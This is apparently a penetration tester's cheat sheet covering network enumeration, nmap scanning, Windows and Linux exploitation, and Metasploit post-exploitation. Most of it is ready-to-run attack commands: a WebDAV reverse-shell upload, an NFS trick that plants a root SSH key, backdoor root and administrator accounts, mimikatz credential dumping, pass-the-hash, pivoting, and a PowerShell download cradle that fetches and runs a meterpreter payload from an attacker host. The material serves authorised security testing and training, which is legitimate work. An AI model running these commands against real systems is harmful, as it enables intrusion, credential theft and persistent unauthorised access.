-------------------------------------------------------------------------- Reminders

LOG EVERYTHING!

Metasploit - spool /home/<username>/.msf3/logs/console.log
Save contents from each terminal!
Linux - script myoutput.txt  # Type exit to stop

[+] Disable network-manager
service network-manager stop

[+] Set IP address
ifconfig eth0 192.168.50.12/24

[+] Set default gateway
route add default gw 192.168.50.9

[+] Set DNS servers
echo "nameserver 192.168.100.2" >> /etc/resolv.conf

[+] Show routing table
Windows - route print
Linux   - route -n

[+] Add static route
Linux - route add -net 192.168.100.0/24 gw 192.16.50.9
Windows - route add 0.0.0.0 mask 0.0.0.0 192.168.50.9

[+] Subnetting easy mode
ipcalc 192.168.0.1 255.255.255.0

[+] Windows SAM file locations
c:\windows\system32\config\
c:\windows\repair\
bkhive system /root/hive.txt
samdump2 SAM /root/hive.txt > /root/hash.txt

[+] Python Shell
python -c 'import pty;pty.spawn("/bin/bash")'

-------------------------------------------------------------------------- Internet Host/Network Enumeration

[+] WHOIS Querying
whois www.domain.com

[+] Resolve an IP using DIG
dig @8.8.8.8 securitymuppets.com

[+] Find Mail servers for a domain
dig @8.8.8.8 securitymuppets.com -t mx

[+] Find any DNS records for a domain
dig @8.8.8.8 securitymuppets.com -t any

[+] Zone Transfer
dig @192.168.100.2 securitymuppets.com -t axfr
host -l securitymuppets.com 192.168.100.2
nslookup / ls -d domain.com.local

[+] Fierce
fierce -dns <domain> -file <output_file>
fierce -dns <domain> -dnsserver <server>
fierce -range <ip-range> -dnsserver <server>
fierce -dns <domain> -wordlist <wordlist>

-------------------------------------------------------------------------- IP Network scanning

[+] ARP Scan
arp-scan 192.168.50.8/28 -I eth0

[+] NMAP Scans

[+] Nmap ping scan
sudo nmap –sn -oA nmap_pingscan 192.168.100.0/24 (-PE)

[+] Nmap SYN/Top 100 ports Scan
nmap -sS -F -oA nmap_fastscan 192.168.0.1/24

[+] Nmap SYN/Version All port Scan - ## Main Scan
sudo nmap -sV -PN -p0- -T4 -A --stats-every 60s --reason -oA nmap_scan 192.168.0.1/24

[+] Nmap SYN/Version No Ping All port Scan
sudo nmap -sV -Pn -p0- --exclude 192.168.0.1 --reason -oA nmap_scan 192.168.0.1/24

[+] Nmap UDP All port scan - ## Main Scan
sudo nmap -sU -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_scan 192.168.0.1/24

[+] Nmap UDP/Fast Scan
nmap -F -sU -oA nmap_UDPscan 192.168.0.1/24

[+] Nmap Top 1000 port UDP Scan
nmap -sU -oA nmap_UDPscan 192.168.0.1/24

[+] HPING3 Scans
hping3 -c 3 -s 53 -p 80 -S 192.168.0.1
Open = flags = SA
Closed = Flags = RA
Blocked = ICMP unreachable
Dropped = No response

[+] Source port scanning
nmap -g <port> (88 (Kerberos) port 53 (DNS) or 67 (DHCP))
Source port also doesn't work for OS detection.

[+] Speed settings
-n 					Disable DNS resolution 
-sS 				TCP SYN (Stealth) Scan 
-Pn 				Disable host discovery
-T5					Insane time template
--min-rate 1000		1000 packets per second
--max-retries 0		Disable retransmission of timed-out probes

-------------------------------------------------------------------------- Cisco/Networking Commands

? - Help
> - User mode
# - Privileged mode
router(config)# - Global Configuration mode

enable secret more secure than enable password.

For example, in the configuration command:
enable secret 5 $1$iUjJ$cDZ03KKGh7mHfX2RSbDqP.
The enable secret has been hashed with MD5, whereas in the command:
username jdoe password 7 07362E590E1B1C041B1E124C0A2F2E206832752E1A01134D
The password has been encrypted using the weak reversible algorithm.

enable - Change to privileged mode to view configs
config terminal/config t - Change to global config mode to modify

#show version - Gives you the router's configuration register (Firmware)
#show running-config - Shows the router, switch, or firewall's current configuration
#show ip route - show the router's routing table
#show tech-support - Dump config but obscure passwords

-------------------------------------------------------------------------- Remote Information Services

[+] DNS
Zone Transfer - host -l securitymuppets.com 192.168.100.2
Metasploit Auxiliarys:
auxiliary/gather/enum_dns
use auxiliary/gather/dns...

[+] Finger - Enumerate Users
finger @192.168.0.1
finger -l -p user@ip-address
auxiliary/scanner/finger/finger_users

[+] NTP
Metasploit Auxiliarys

[+] SNMP
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
Metasploit Module snmp_enum
snmpcheck -t snmpservice

[+] rservices
rwho 192.168.0.1
rlogin -l root 192.168.0.17

[+] RPC Services
rpcinfo -p
Endpoint_mapper metasploit

-------------------------------------------------------------------------- Web Services

[+] WebDAV
Metasploit Auxiliarys
Upload shell to Vulnerable WebDAV directory:
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=4444 R | msfencode -t asp -o shell.asp
cadaver http://192.168.0.60/
put shell.asp shell.txt
copy shell.txt shell.asp;.txt
Start reverse handler - browse to http://192.168.0.60/shell.asp;.txt


-------------------------------------------------------------------------- Windows Networking Services

[+] Get Domain Information:
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

[+] Netbios Enumeration
nbtscan -r 192.168.0.1-100
nbtscan -f hostfiles.txt

[+] enum4linux

[+] RID Cycling
use auxiliary/scanner/smb/smb_lookupsid

[+] Null Session in Windows
net use \\192.168.0.1\IPC$ "" /u:""

[+] Null Session in Linux
smbclient -L //192.168.99.131

-------------------------------------------------------------------------- Accessing Email Services

Metasploit Auxiliarys

[+] SMTP Open Relay Commands

[-] ncat -C 86.54.23.178 25
[-] HELO mail.co.uk
[-] MAIL FROM: <Attacker@mail.co.uk>
[-] RCPT TO: <Victim@email.com>
[-] DATA
Test Email - some malicious stuff!

-------------------------------------------------------------------------- VPN Testing

[+] ike-scan
ike-scan 192.168.207.134
sudo ike-scan -A 192.168.207.134
sudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key

[+] pskcrack
psk-crack -b 5 192-168-207-134key
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary 192-168-207-134key

-------------------------------------------------------------------------- Unix RPC

[+] NFS Mounts

Metasploit : auxiliary/scanner/nfs/nfsmount

rpcinfo -p 192.168.0.10

showmount -e 192.168.0.10
mount 192.168.0.10:/secret /mnt/share/

ssh-keygen
mkdir /tmp/r00t
mount -t nfs 192.168.0.10:/secret /mnt/share/
cat ~/.ssh/id_rsa.pub >> /mnt/share/root/.ssh/authorized_keys
umount /mnt/share
ssh root@192.168.0.10

-------------------------------------------------------------------------- Post Exploitation

[+] Command prompt access on Windows Host

pth-winexe -U Administrator%<hash> //<host ip> cmd.exe

[+] Add Linux User
/usr/sbin/useradd –g 0 –u 0 –o user
echo user:password | /usr/sbin/chpasswd

[+] Add Windows User
net user username password@1 /add
net localgroup administrators username /add

[+] Solaris Commands
useradd -o user
passwd user
usermod -R root user

[+] Dump remote SAM:
PwDump.exe -u localadmin 192.168.0.1

[+] Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords full

[+] Meterpreter
meterpreter> run winenum
meterpreter> use post/windows/gather/smart_hashdump

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker password1 -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10

meterpreter > load mimikatz
meterpreter > wdigest
meterpreter > getWdigestPasswords
Migrate if does not work!

[+] Kitrap0d
Download vdmallowed.exe and vdmexploit.dll to victim
Run vdmallowed.exe to execute system shell

[+] Windows Information
On Windows:
ipconfig /all
systeminfo
net localgroup administrators
net view
net view /domain

[+] SSH Tunnelling
Remote forward port 222
ssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118

-------------------------------------------------------------------------- Metasploit

----------------- [+] Metasploit Pivot

Compromise 1st machine

# meterpreter> run arp_scanner -r 10.10.10.0/24
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/scanner/portscan/tcp
use bind shell

or run autoroute:

# meterpreter > ipconfig
# meterpreter > run autoroute -s 10.1.13.0/24
# meterpreter > getsystem
# meterpreter > run hashdump
# use auxiliary/scanner/portscan/tcp
# msf auxiliary(tcp) > use exploit/windows/smb/psexec 

or port forwarding:
# meterpreter > run autoroute -s 10.1.13.0/24
# use auxiliary/scanner/portscan/tcp
# meterpreter > portfwd add -l <listening port> -p <remote port> -r <remote/internal host>

or socks proxy:
route add 10.10.10.10 255.255.255.248 <session>
use auxiliary/server/socks4a
Add proxy to /etc/proxychains.conf
proxychains nmap -sT -T4 -Pn 10.10.10.50
setg socks4:127.0.0.1:1080

----------------- [+] Pass the hash

If NTML only:
00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c

STATUS_ACCESS_DENIED (Command=117 WordCount=0):
This can be remedied by navigating to the registry key, "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" on the target systems and setting the value of "RequireSecuritySignature" to "0"

Run hashdump on the first compromised machine:
run post/windows/gather/hashdump

Run Psexec module and specify the hash:
use exploit/windows/smb/psexec

----------------- [+] Enable RDP:
meterpreter > run getgui -u hacker -p s3cr3t
Clean up command: meterpreter > run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20110112.2448.rc

----------------- [+] AutoRunScript
Automatically run scripts before exploiation:
set AutoRunScript "migrate explorer.exe"

[+] Set up SOCKS proxy in MSF

[+] Run a post module against all sessions
resource /usr/share/metasploit-framework/scripts/resource/run_all_post.rc

[+] Find local subnets 'Whilst in meterpreter shell'
meterpreter > run get_local_subnets

# Add the correct Local host and Local port parameters
echo "Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.0.7 -Lport 443 -Force" >> /var/www/payload

# Set up psexec module on metasploit
auxiliary/admin/smb/psexec_command
set command powershell -Exec Bypass -NoL -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.0.9/payload\')

# Start reverse Handler to catch the reverse connection
Module options (exploit/multi/handler):
Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST     192.168.0.9      yes       The local listener hostname
   LPORT     443              yes       The local listener port

# Show evasion module options
show evasion

[+] Metasploit Shellcode
msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d'

-------------------------------------------------------------------------- File Transfer Services

[+] Start TFTPD Server
atftpd --daemon --port 69 /tmp

[+] Connect to TFTP Server
tftp 192.168.0.10
put / get files

-------------------------------------------------------------------------- LDAP Querying

Tools:
ldapsearch
LDAPExplorertool2

Anonymous Bind:
ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"

Authenticated:
ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W

Useful Links:
http://www.lanmaster53.com/2013/05/public-facing-ldap-enumeration/
http://blogs.splunk.com/2009/07/30/ldapsearch-is-your-friend/


-------------------------------------------------------------------------- Password Attacks

[+] Bruteforcing http password prompts
medusa -h <ip/host> -u <user> -P <password list> -M http -n <port> -m DIR:/<directory> -T 30
